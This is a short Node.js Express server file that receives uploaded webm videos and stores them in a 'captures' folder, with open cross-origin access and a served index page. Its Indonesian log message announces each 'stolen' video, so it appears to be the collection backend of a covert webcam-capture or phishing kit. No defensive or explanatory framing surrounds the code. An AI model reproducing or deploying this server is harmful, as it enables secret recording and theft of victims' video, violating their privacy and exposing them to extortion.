const express = require('express'); 
const multer = require('multer'); 
const path = require('path'); 
const fs = require('fs'); 

const app = express(); 
const PORT = 8080;
const UPLOAD_DIR = path.join(__dirname, 'captures');
if (!fs.existsSync(UPLOAD_DIR)){ fs.mkdirSync(UPLOAD_DIR); } 

const storage = multer.diskStorage({ 
    destination: function (req, file, cb) { cb(null, UPLOAD_DIR) }, 
    filename: function (req, file, cb) {  
    
const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9) 
    cb(null, file.fieldname + '-' + uniqueSuffix + '.webm') } 
    }); 
    const upload = multer({ storage: storage });

    app.use((req, res, next) => { 
        res.header('Access-Control-Allow-Origin', '*'); 
        res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS'); 
        res.header('Access-Control-Allow-Headers', 'Content-Type'); next(); }); 
        app.post('/upload', upload.single('video'), (req, res) => { 

            if (req.file) { console.log(`[TCL] Video baru dicuri dan disimpan: ${req.file.path}`); 
            res.status(200).send({ message: 'Sukses disimpan,' }); }

            else { res.status(400).send({ message: 'Gagal upload,' }); } });
            app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

            app.listen(PORT, () => {
    console.log(`[TCL] Server jalan di http://localhost:${PORT}`);
});

